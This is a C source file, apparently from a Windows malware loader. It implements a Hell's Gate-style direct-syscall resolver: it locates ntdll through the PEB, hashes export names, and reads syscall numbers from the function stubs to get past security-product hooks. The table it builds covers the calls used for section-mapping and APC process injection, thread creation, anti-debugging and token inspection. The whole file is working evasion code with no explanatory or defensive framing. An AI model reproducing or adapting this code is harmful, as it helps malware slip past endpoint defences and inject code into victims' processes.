#include "Common.h"

VX_TABLE g_SyscallsTable = { 0 };

BOOL GetImageExportDirectory(PVOID pModuleBase, PIMAGE_EXPORT_DIRECTORY* ppImageExportDirectory)
{
	if (!pModuleBase) {
		return FALSE;
	}

	// Get DOS header
	PIMAGE_DOS_HEADER pImageDosHeader = (PIMAGE_DOS_HEADER)pModuleBase;
	if (pImageDosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
		return FALSE;
	}

	// Get NT headers
	PIMAGE_NT_HEADERS pImageNtHeaders = (PIMAGE_NT_HEADERS)((PBYTE)pModuleBase + pImageDosHeader->e_lfanew);
	if (pImageNtHeaders->Signature != IMAGE_NT_SIGNATURE) {
		return FALSE;
	}

	// Get the EAT
	*ppImageExportDirectory = (PIMAGE_EXPORT_DIRECTORY)((PBYTE)pModuleBase + pImageNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
	return TRUE;
}

BOOL GetVxTableEntry(PVOID pModuleBase, PIMAGE_EXPORT_DIRECTORY pImageExportDirectory, PVX_TABLE_ENTRY pVxTableEntry) {
	PDWORD pdwAddressOfFunctions = (PDWORD)((PBYTE)pModuleBase + pImageExportDirectory->AddressOfFunctions);
	PDWORD pdwAddressOfNames = (PDWORD)((PBYTE)pModuleBase + pImageExportDirectory->AddressOfNames);
	PWORD pwAddressOfNameOrdinales = (PWORD)((PBYTE)pModuleBase + pImageExportDirectory->AddressOfNameOrdinals);

	for (WORD cx = 0; cx < pImageExportDirectory->NumberOfNames; cx++) {
		PCHAR pczFunctionName = (PCHAR)((PBYTE)pModuleBase + pdwAddressOfNames[cx]);
		PVOID pFunctionAddress = (PBYTE)pModuleBase + pdwAddressOfFunctions[pwAddressOfNameOrdinales[cx]];

		if (RTIME_HASHA(pczFunctionName) == pVxTableEntry->dwHash) {
			pVxTableEntry->pAddress = pFunctionAddress;

			// Quick and dirty fix in case the function has been hooked
			WORD cw = 0;
			while (TRUE) {
				// check if syscall, in this case we are too far
				if (*((PBYTE)pFunctionAddress + cw) == 0x0f && *((PBYTE)pFunctionAddress + cw + 1) == 0x05)
					return FALSE;

				// check if ret, in this case we are also probaly too far
				if (*((PBYTE)pFunctionAddress + cw) == 0xc3)
					return FALSE;

				// First opcodes should be :
				//    MOV R10, RCX
				//    MOV RCX, <syscall>
				if (*((PBYTE)pFunctionAddress + cw) == 0x4c
					&& *((PBYTE)pFunctionAddress + 1 + cw) == 0x8b
					&& *((PBYTE)pFunctionAddress + 2 + cw) == 0xd1
					&& *((PBYTE)pFunctionAddress + 3 + cw) == 0xb8
					&& *((PBYTE)pFunctionAddress + 6 + cw) == 0x00
					&& *((PBYTE)pFunctionAddress + 7 + cw) == 0x00) {
					BYTE high = *((PBYTE)pFunctionAddress + 5 + cw);
					BYTE low = *((PBYTE)pFunctionAddress + 4 + cw);
					pVxTableEntry->wSystemCall = (high << 8) | low;
					break;
				}

				cw++;
			};
		}
	}

	return TRUE;
}

// TODO: refactor
BOOL InitializeSyscalls() {
	//PRINTA("[i] Initializing Syscalls Table...\n");

	// Get the PEB
	PTEB pCurrentTeb = RtlGetThreadEnvironmentBlock();
	PPEB pCurrentPeb = pCurrentTeb->ProcessEnvironmentBlock;
	if (!pCurrentPeb || !pCurrentTeb || pCurrentPeb->OSMajorVersion != 0xA)
		return FALSE;

	// Get NTDLL module 
	PLDR_DATA_TABLE_ENTRY pLdrDataEntry = (PLDR_DATA_TABLE_ENTRY)((PBYTE)pCurrentPeb->LoaderData->InMemoryOrderModuleList.Flink->Flink - 0x10);
	PVOID ntDllBaseAddress = pLdrDataEntry->DllBase;
	if (!ntDllBaseAddress)
		return FALSE;

	// Get the EAT of NTDLL
	PIMAGE_EXPORT_DIRECTORY pImageExportDirectory = NULL;
	if (!GetImageExportDirectory(pLdrDataEntry->DllBase, &pImageExportDirectory) || pImageExportDirectory == NULL)
		return FALSE;

	// Initialize the syscalls table
	g_SyscallsTable.NtCreateSection.dwHash = NtCreateSectionHashValue;
	g_SyscallsTable.NtMapViewOfSection.dwHash = NtMapViewOfSectionHashValue;
	g_SyscallsTable.NtUnmapViewOfSection.dwHash = NtUnmapViewOfSectionHashValue;
	g_SyscallsTable.NtClose.dwHash = NtCloseHashValue;
	g_SyscallsTable.NtCreateThreadEx.dwHash = NtCreateThreadExHashValue;
	g_SyscallsTable.NtWaitForSingleObject.dwHash = NtWaitForSingleObjectHashValue;
	g_SyscallsTable.NtQuerySystemInformation.dwHash = NtQuerySystemInformationHashValue;
	g_SyscallsTable.NtDelayExecution.dwHash = NtDelayExecutionHashValue;
	g_SyscallsTable.NtAllocateVirtualMemory.dwHash = NtAllocateVirtualMemoryHashValue;
	g_SyscallsTable.NtProtectVirtualMemory.dwHash = NtProtectVirtualMemoryHashValue;
	g_SyscallsTable.NtWriteVirtualMemory.dwHash = NtWriteVirtualMemoryHashValue;
	g_SyscallsTable.NtQueueApcThread.dwHash = NtQueueApcThreadHashValue;
	g_SyscallsTable.NtQueryInformationProcess.dwHash = NtQueryInformationProcessHashValue;
	g_SyscallsTable.NtRemoveProcessDebug.dwHash = NtRemoveProcessDebugHashValue;
	g_SyscallsTable.NtFreeVirtualMemory.dwHash = NtFreeVirtualMemoryHashValue;
	g_SyscallsTable.NtOpenProcessToken.dwHash = NtOpenProcessTokenHashValue;
	g_SyscallsTable.NtQueryInformationToken.dwHash = NtQueryInformationTokenHashValue;

	if (!GetVxTableEntry(ntDllBaseAddress, pImageExportDirectory, &g_SyscallsTable.NtCreateSection) ||
		!GetVxTableEntry(ntDllBaseAddress, pImageExportDirectory, &g_SyscallsTable.NtMapViewOfSection) ||
		!GetVxTableEntry(ntDllBaseAddress, pImageExportDirectory, &g_SyscallsTable.NtUnmapViewOfSection) ||
		!GetVxTableEntry(ntDllBaseAddress, pImageExportDirectory, &g_SyscallsTable.NtClose) ||
		!GetVxTableEntry(ntDllBaseAddress, pImageExportDirectory, &g_SyscallsTable.NtCreateThreadEx) ||
		!GetVxTableEntry(ntDllBaseAddress, pImageExportDirectory, &g_SyscallsTable.NtWaitForSingleObject) ||
		!GetVxTableEntry(ntDllBaseAddress, pImageExportDirectory, &g_SyscallsTable.NtQuerySystemInformation) ||
		!GetVxTableEntry(ntDllBaseAddress, pImageExportDirectory, &g_SyscallsTable.NtDelayExecution) ||
		!GetVxTableEntry(ntDllBaseAddress, pImageExportDirectory, &g_SyscallsTable.NtAllocateVirtualMemory) ||
		!GetVxTableEntry(ntDllBaseAddress, pImageExportDirectory, &g_SyscallsTable.NtProtectVirtualMemory) ||
		!GetVxTableEntry(ntDllBaseAddress, pImageExportDirectory, &g_SyscallsTable.NtWriteVirtualMemory) ||
		!GetVxTableEntry(ntDllBaseAddress, pImageExportDirectory, &g_SyscallsTable.NtQueueApcThread) ||
		!GetVxTableEntry(ntDllBaseAddress, pImageExportDirectory, &g_SyscallsTable.NtQueryInformationProcess) ||
		!GetVxTableEntry(ntDllBaseAddress, pImageExportDirectory, &g_SyscallsTable.NtRemoveProcessDebug) ||
		!GetVxTableEntry(ntDllBaseAddress, pImageExportDirectory, &g_SyscallsTable.NtFreeVirtualMemory) ||
		!GetVxTableEntry(ntDllBaseAddress, pImageExportDirectory, &g_SyscallsTable.NtOpenProcessToken) ||
		!GetVxTableEntry(ntDllBaseAddress, pImageExportDirectory, &g_SyscallsTable.NtQueryInformationToken)
		)
		return FALSE;

	PRINTA("[+] Syscalls Table Initialized\n");
	PRINTA("[+] NtCreateSection SSN %d\n", g_SyscallsTable.NtCreateSection.wSystemCall);
	PRINTA("[+] NtMapViewOfSection SSN %d\n", g_SyscallsTable.NtMapViewOfSection.wSystemCall);
	PRINTA("[+] NtUnmapViewOfSection SSN %d\n", g_SyscallsTable.NtUnmapViewOfSection.wSystemCall);
	PRINTA("[+] NtClose SSN %d\n", g_SyscallsTable.NtClose.wSystemCall);
	PRINTA("[+] NtCreateThreadEx SSN %d\n", g_SyscallsTable.NtCreateThreadEx.wSystemCall);
	PRINTA("[+] NtWaitForSingleObject SSN %d\n", g_SyscallsTable.NtWaitForSingleObject.wSystemCall);
	PRINTA("[+] NtQuerySystemInformation SSN %d\n", g_SyscallsTable.NtQuerySystemInformation.wSystemCall);
	PRINTA("[+] NtDelayExecution SSN %d\n", g_SyscallsTable.NtDelayExecution.wSystemCall);
	PRINTA("[+] NtAllocateVirtualMemory SSN %d\n", g_SyscallsTable.NtAllocateVirtualMemory.wSystemCall);
	PRINTA("[+] NtProtectVirtualMemory SSN %d\n", g_SyscallsTable.NtProtectVirtualMemory.wSystemCall);
	PRINTA("[+] NtWriteVirtualMemory SSN %d\n", g_SyscallsTable.NtWriteVirtualMemory.wSystemCall);
	PRINTA("[+] NtQueueApcThread SSN %d\n", g_SyscallsTable.NtQueueApcThread.wSystemCall);
	PRINTA("[+] NtQueryInformationProcess SSN %d\n", g_SyscallsTable.NtQueryInformationProcess.wSystemCall);
	PRINTA("[+] NtRemoveProcessDebug SSN %d\n", g_SyscallsTable.NtRemoveProcessDebug.wSystemCall);
	PRINTA("[+] NtFreeVirtualMemory SSN %d\n", g_SyscallsTable.NtFreeVirtualMemory.wSystemCall);
	PRINTA("[+] NtOpenProcessToken SSN %d\n", g_SyscallsTable.NtOpenProcessToken.wSystemCall);
	PRINTA("[+] NtQueryInformationToken SSN %d\n", g_SyscallsTable.NtQueryInformationToken.wSystemCall);

	return TRUE;
}

